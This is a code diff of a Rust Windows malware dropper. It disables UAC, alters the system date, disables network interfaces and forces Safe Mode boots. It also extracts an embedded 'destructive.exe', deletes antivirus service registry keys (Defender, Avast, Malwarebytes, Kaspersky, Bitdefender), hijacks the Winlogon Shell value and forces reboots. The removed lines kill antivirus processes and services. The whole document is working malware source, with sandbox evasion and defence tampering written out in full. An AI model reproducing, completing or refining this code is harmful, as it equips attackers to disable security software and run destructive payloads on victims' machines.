@@ -1,61 +1,10 @@
 use std::process::{Command, Stdio};
 use std::path::{Path};
-use std::fs::{File, OpenOptions};
+use std::fs::{File};
 use std::io::{self, Write};
 use winreg::enums::*;
 use winreg::RegKey;
 use std::fs;
-
-fn is_in_safe_mode() -> bool {
-    let batch_content = r#"@echo off
-bcdedit /enum {current} | findstr /i "safeboot"
-if %errorlevel% == 0 (
-    echo Safe Mode detected > "C:\Program Files\utkudrk2\test.txt"
-) else (
-    del "C:\Program Files\utkudrk2\test.txt" 2>nul
-)"#;
-
-    // Define paths
-    let dir_path = Path::new(r"C:\Program Files\utkudrk2");
-    let batch_path = dir_path.join("utkubaba.bat");
-    let test_file_path = dir_path.join("test.txt");
-
-    // Ensure the directory exists
-    if let Err(e) = fs::create_dir_all(dir_path) {
-        eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
-        std::process::exit(1); // Exit the program with a failure status
-    }
-
-    // Write the batch script
-    if let Err(e) = fs::write(&batch_path, batch_content) {
-        eprintln!("Failed to write batch file: {}", e);
-        return false;
-    }
-
-    // Execute the batch script
-    if let Err(e) = Command::new("cmd")
-        .args(["/C", batch_path.to_str().unwrap()])
-        .status()
-    {
-        eprintln!("Failed to execute batch script: {}", e);
-        return false;
-    }
-
-    // Check if Safe Mode was detected by the existence of the file
-    let is_safe_mode = test_file_path.exists();
-
-    // Cleanup: remove the batch file and test.txt if exists
-    if let Err(e) = fs::remove_file(&batch_path) {
-        eprintln!("Failed to remove batch file: {}", e);
-    }
-    if test_file_path.exists() {
-        if let Err(e) = fs::remove_file(&test_file_path) {
-            eprintln!("Failed to remove test.txt: {}", e);
-        }
-    }
-
-    is_safe_mode
-}
 
 fn disable_uac() -> io::Result<()> {
     // Open the registry key for User Account Control
@@ -175,7 +124,7 @@ fn modify_registry() -> io::Result<()> {
 }
 
 fn create_batch_file() -> io::Result<()> {
-    // Create a batch file to clean up Safe Mode and schedule destructive.exe
+    // Create a batch file to clean up Safe Mode and schedule desturctive.exe
     let batch_content = r#"
 @echo off
 :: Check if we are in Safe Mode by examining the current boot entry
@@ -183,43 +132,26 @@ bcdedit /enum {current} | findstr /i "safeboot"
 if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
-    echo Safe Mode is not enabled. Restarting in Safe Mode...
-    bcdedit.exe /set {current} safeboot minimal
-    shutdown -r -t 7
+    echo Safe Mode is not enabled
+    "c:\program files\utkudrk2\destructive.exe"
+    exit
 )
 
 :: Wait for the reboot to happen and run this part only after Safe Mode is entered
 
-:: Modify Shell registry to run destructive file
+:: Modify Shell registry to run batch file
 echo Modifying registry to set Shell value...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Program Files\utkudrk2\destructive.exe" /f
-
-:: Kill antivirus processes
-echo Terminating antivirus processes...
-taskkill /F /IM AvastSvc.exe /T
-taskkill /F /IM AvastUI.exe /T
-taskkill /F /IM AvastWscReporter.exe /T
-taskkill /F /IM aswVmm.exe /T
-taskkill /F /IM MBAMService.exe /T
-taskkill /F /IM MsMpEng.exe /T
-taskkill /F /IM VSSERV.exe /T
-
-:: Stop antivirus services
-echo Stopping antivirus services...
-sc stop "AvastSvc"
-sc stop "AvastWscReporter"
-sc stop "aswVmm"
-sc stop "MBAMService"
-sc stop "WinDefend"
-sc stop "VSSERV"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\program files\utkudrk2\utkudrk2.bat" /f
 
 :: Perform cleanup tasks
+echo Removing Safe Mode setting...
+bcdedit /deletevalue {current} safeboot
+
+:: Delete registry keys related to antivirus services
 echo Deleting registry keys...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AvastSvc" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AvastWscReporter" /f
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\aswVmm" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
@@ -229,52 +161,18 @@ reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 
-setlocal enabledelayedexpansion
+:: Confirm completion
+echo Cleanup tasks completed. Safe Mode should now be removed, desturctive.exe is scheduled to run, and Shell key is modified.
 
-set "targetDir=C:\Program Files\utkudrk2"
-set "exceptionFile=destructive.exe"
+:: Reboot the system after completion
+shutdown /r /f /t 5
 
-:: Create a temporary batch file for cleanup
-set "tempBatchFile=%TEMP%\cleanup.bat"
-
-echo @echo off > "%tempBatchFile%"
-echo setlocal enabledelayedexpansion >> "%tempBatchFile%"
-echo set "targetDir=%targetDir%" >> "%tempBatchFile%"
-echo set "exceptionFile=%exceptionFile%" >> "%tempBatchFile%"
-echo if exist "!targetDir!" ( >> "%tempBatchFile%"
-echo     for %%F in ("!targetDir!\*") do ( >> "%tempBatchFile%"
-echo         if /I not "%%~nxF"=="!exceptionFile!" ( >> "%tempBatchFile%"
-echo             del /f /q "%%F" >> "%tempBatchFile%"
-echo         ) >> "%tempBatchFile%"
-echo     ) >> "%tempBatchFile%"
-echo ) >> "%tempBatchFile%"
-echo :: Confirm completion >> "%tempBatchFile%"
-echo echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified. >> "%tempBatchFile%"
-echo :: Run destructive.exe >> "%tempBatchFile%"
-echo "\"!targetDir!\destructive.exe\"" >> "%tempBatchFile%"  :: Properly quoting path
-echo call "!targetDir!\destructive.exe" >> "%tempBatchFile%" :: Run destructive.exe
-echo :: Initiate system restart after 7 seconds >> "%tempBatchFile%"
-echo shutdown -r -t 7 >> "%tempBatchFile%"  :: Shutdown with restart after 7 seconds
-echo endlocal >> "%tempBatchFile%"
-
-:: Run the cleanup batch file
-call "%tempBatchFile%"
-
-endlocal
+:: Exit
 exit
 "#;
 
-    // Define the path to the batch file.
-    let path = Path::new("C:\\Program Files\\utkudrk2\\utkudrk2.bat");
-
-    // Create the file (ensure the directory exists and is writable).
-    let mut file = OpenOptions::new()
-        .create(true)
-        .write(true)
-        .truncate(true)
-        .open(path)?;
-
-    // Write the batch content to the file.
+    let path = Path::new("c:\\Program Files\\utkudrk2\\utkudrk2.bat");
+    let mut file = File::create(path)?;
     file.write_all(batch_content.as_bytes())?;
 
     Ok(())
@@ -319,29 +217,16 @@ fn main() {
 
     println!("Admin privileges confirmed.");
 
-    // Step 2: Check if the system is in Safe Mode
-    if !is_in_safe_mode() {
-        println!("System is not in Safe Mode. Enabling Safe Mode and rebooting...");
+    //Define directory path
+    let dir_path = Path::new(r"C:\Program Files\utkudrk2");
 
-        // Enable Safe Mode
-        if let Err(e) = enable_safe_mode() {
-            eprintln!("Error enabling safe mode: {}", e);
-            return;
-        }
-
-        // Reboot the system to Safe Mode
-        if let Err(e) = reboot_system() {
-            eprintln!("Error rebooting system to Safe Mode: {}", e);
-            return;
-        }
-
-        // Exit after rebooting to avoid running further operations
-        return;
-    } else {
-        println!("System is in Safe Mode. Proceeding with further steps...");
+    // Ensure the directory exists
+    if let Err(e) = fs::create_dir_all(dir_path) {
+        eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
+        std::process::exit(1); // Exit the program with a failure status
     }
 
-    // Continue with operations in Safe Mode
+    // Step 2: Kaspersky, Bitdefender bypass (General Antivirus bypass)
     if let Err(e) = change_system_date() {
         eprintln!("Error changing system date: {}", e);
     }
@@ -350,24 +235,35 @@ fn main() {
         eprintln!("Error disabling network interfaces: {}", e);
     }
 
+    // Step 3: Enable safe mode
+    if let Err(e) = enable_safe_mode() {
+        eprintln!("Error enabling safe mode: {}", e);
+    }
+
+    // Step 4: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
     }
 
+    // Step 5: Extract payload
     if let Err(e) = extract_embedded_exe() {
         eprintln!("Error extracting embedded executable: {}", e);
     }
-
+    
+    // Step 6: Create the batch file in the current directory
     if let Err(e) = create_batch_file() {
         eprintln!("Error creating batch file: {}", e);
         return;
     }
 
+    // Step 7: Reboot the system to Safe Mode if needed
     if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
 
+    // Step 9: Modify the registry to set Shell value
     if let Err(e) = modify_registry() {
         eprintln!("Error modifying the registry: {}", e);
     }
+
 }
